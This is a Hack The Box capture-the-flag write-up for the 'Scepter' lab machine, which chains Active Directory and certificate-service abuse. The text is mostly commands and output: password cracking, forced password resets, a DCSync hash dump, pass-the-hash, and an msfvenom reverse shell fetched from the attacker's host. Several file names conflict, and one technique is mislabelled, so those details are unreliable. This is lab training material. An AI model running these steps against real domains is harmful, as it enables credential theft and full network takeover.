
# HTB Scepter - Writeup (English)

> 🚨 **Follow the HTB grind in real-time — leaks, drops, and deep writeups**  
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)  
> _Don't read. Join._

**Platform:** Windows  
**IP:** 10.10.11.65  
**Difficulty:** Hard  
**Author:** NoSec

---

## Recon
```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0
```
Service Info: Host: DC01; OS: Windows

---

## Preparation

- **Editing the hosts file**
    ```bash
    sudo nano /etc/hosts
    ```
    ```
    10.10.11.65     dc01.scepter.htb scepter.htb
    ```

- **Clock skew (time synchronization)**
    ```bash
    sudo rdate -n scepter.htb
    ```

---

## NFS Share & Certificates

**NFS is accessible, let's mount it:**

```bash
showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)
mkdir /tmp/helpdesk
sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk
ls -l /tmp/helpdesk
```
**Found files:**
- baker.crt
- baker.key
- clark.pfx
- lewis.pfx
- scott.pfx

**Cracking password for PFX:**
```bash
pfx2john clark.pfx > clark.hash
john --wordlist=/usr/share/wordlists/rockyou.txt clark.hash
```
Password: `ne*********`

**Unlocking baker.key**
```bash
openssl rsa -in baker.key -out baker.plain.key
```

**baker.key + baker.crt → pfx:**
```bash
sudo openssl pkcs12 -export -out baker.pfx -inkey baker.plain.key -in baker.crt
```

---

## Certipy authentication with baker.pfx

```bash
certipy auth -pfx baker.pfx -username d.baker -dc-ip 10.10.11.65

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'd.baker@scepter.htb'
[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'
[*] Using principal: 'd.baker@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'd.baker.ccache'
[*] Wrote credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b
```
Getting TGT, dumping hash, exporting .ccache:
```bash
export KRB5CCNAME=d.baker.ccache
```

---

## Certipy find & obtaining new cert

```bash
certipy find -k -no-pass -dc-ip 10.10.11.65 -target dc01.scepter.htb
certipy req -u 'd.baker@scepter.htb' -dc-ip 10.10.11.65 -dc-host dc01.scepter.htb -target dc01.scepter.htb -ca 'scepter-DC01-CA' -template 'User' -k -no-pass
```

---

## Bloodhound & Privilege Escalation Chain

**Running BloodHound:**
```bash
sudo bloodhound-python \
   -u 'd.baker' \
   -d scepter.htb \
   -k -no-pass \
   -dc dc01.scepter.htb \
   -ns 10.10.11.65 \
   --dns-tcp \
   --disable-autogc \
   -c all --zip
```
**Finding:**  
- d.baker user can **force change password** on a.carter.

---

## Force Change Password - a.carter user

## Certipy auth with new NT hash and ccache

```bash
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65
export KRB5CCNAME=d.baker.ccache
```
## Changing a.carter's password in rpcclient

```bash
pth-rpcclient -U 'SCEPTER\d.baker%aad3b4...:18b5fb...' 10.10.11.65 -c "setuserinfo2 a.carter 23 'NoSecHere!'"
```

---

## GGenericAll on StaffAccessCertificate OU

```bash
bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

---

## StaffAccessCertificate template abuse

```bash
certipy req -username "d.baker@scepter.htb" -hashes :18b5fb... -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
```

---

## Getting NT hash for h.brown

```bash
certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b5
```
Hash: `aad3b4...:4ecf52...`

---

## Editing krb5.conf

```ini
[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
```

---
## Exporting h.brown’s ccache file

```bash
export KRB5CCNAME=h.brown.ccache
```

## evil-winrm with h.brown

```bash
evil-winrm -i dc01.scepter.htb -u h.brown
```

**User flag done!**
---
## Creating the payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o dara.exe
```
## Downloading to target

```bash
Invoke-WebRequest -Uri "http://10.10.14.8/dara.exe" -OutFile "dara.exe"
```

## Setting up msfconsole

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.8
lhost => 10.10.14.8
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
```

## Privilege escalation – creating new machine account, Shadow Credentials

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'NoSecHere!' --dc-ip 10.10.11.65 add computer nosecpc 'Password123'
[+] nosecpc created
```

## Checking exact CA and Template name


```bash
certipy find -u 'nosecpc$' -p 'Password123' -target 10.10.11.65

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'scepter-DC01-CA'
[-] Got error: module 'enum' has no attribute '_decompose'
[-] Use -debug to print a stacktrace
```

**Certipy find + req → obtain machine certificate**

```bash
certipy req -ca scepter-DC01-CA -template Machine -target 10.10.11.65 -username 'nosecpc$' -password 'Password123'

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with DNS Host Name 'nosecpc.scepter.htb'
[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9101'
[*] Saved certificate and private key to 'nosecpc.pfx'
```

## Getting the cert

```bash
certipy cert -pfx meow.pfx -nokey -out nosecpc.crt
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'nosecpc.crt'
```

```bash
**openssl x509 -in nosecpc.crt -noout -serial -issuer**
serial=6200000009929668CFF0981AD8000000000009
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

## Converting to colon-separated hex string

```bash
echo 6200000009929668CFF0981AD8000000000009 | sed 's/../&:/g;s/:$//'
```
---

## Generating X509 string (Python)

```python
import argparse

def convert(serial, issuer):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    serial_hex = ''.join(['%02x' % b for b in serial_bytes])
    issuer_parts = issuer.split(',')
    issuer_parts = [p.strip() for p in issuer_parts]
    issuer_parts.reverse()
    issuer_str = ','.join(issuer_parts)
    print(f"X509:<I>{issuer_str}<SR>{serial_hex}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')
    parser.add_argument('-issuer', required=True, help='Certificate issuer')
    args = parser.parse_args()
    convert(args.serial, args.issuer)
```
**Run:**
```bash
python3 conv.py -serial 62:00:00:00:09:92:96:68:CF:F0:98:1A:D8:00:00:00:00:00:09 -issuer "DC=htb, DC=scepter, CN=scepter-DC01-CA"
```
Example output:
```
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900000062
```

---

## PowerShell: setting altSecurityIdentities, defining $map variable

```powershell
$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900000062'
Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
```

---

## Certipy auth as p.adams

```bash
certipy auth -pfx nonamepc.pfx -dc-ip 10.10.11.65 -username p.adams
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'meow$'
Do you want to continue? (Y/n) y
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b5
```
Hash: `aad3b4...:1b925c...`

---

## DCSync (ADDC hash dump)

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc -hashes aad3b4...:1b925c... scepter.htb/p.adams@10.10.11.65
```

---

## Pass-the-Hash Admin shell

```bash
evil-winrm -i 10.10.11.65 -u Administrator -H a291ea...
```

Root flag done!

---

---

## Notes & Explanation

### What did I learn from this machine?

- **ADCS/PKI attack chain**: I went step-by-step through the full chain: NFS share → certificate decryption → user & machine cert → shadow credentials → DCSync → Pass-the-Hash.
- **Using BloodHound**: Almost every privilege escalation opportunity was revealed here; from that point, the whole chain was BloodHound-based.
- **Certificate abuse**: It was especially interesting to see how quickly *GenericAll* rights can lead to full domain compromise.
- **AD privilege modeling**: Every delegation, OU, and attribute permission was exploitable — even the test mail write was a useful signal.
- **Shadow Credentials (ESC8)**: A modern and real-world attack technique — definitely relevant in live AD environments.
- **Scripting (conv.py)**: A simple Python script can save you a ton of manual pain when dealing with ADCS X509 string transformations.

---

### Mistakes, Pitfalls, Tips

- **Time sync is mandatory!**  
  If your system clock is off, every Kerberos/PKINIT step will throw errors.
- **Certipy and bloodyAD versions matter**  
  Some commands may differ between old/new Certipy. Always update or install from source.
- **Never trust default permissions**  
  A misconfigured *GenericAll* or *Write* right can compromise the entire domain.
- **Always test write access before touching critical attributes**  
  (e.g. mail write test – if that works, shadow creds will too).

---

### Summary

**Scepter** is a perfect example of how a “simple” NFS share combined with a few ADCS misconfigurations  
can lead to **full Active Directory compromise using modern tools**.

The box walks you through both classic and modern privilege escalation techniques,  
while teaching you about ADCS, LDAP, privilege management,  
and the BloodHound ecosystem at every step.

- **User flag:** ADCS abuse, reset, privilege escalation  
- **Root flag:** Shadow credentials, DCSync hash dump, PTH admin shell

**Highly recommended for anyone interested in AD privilege escalation, certificate abuse,  
or Red Teaming in general!**

---

*By [NoSec](https://github.com/No4Sec/)*  
*If you have questions or want more explanation, feel free to reach out!*

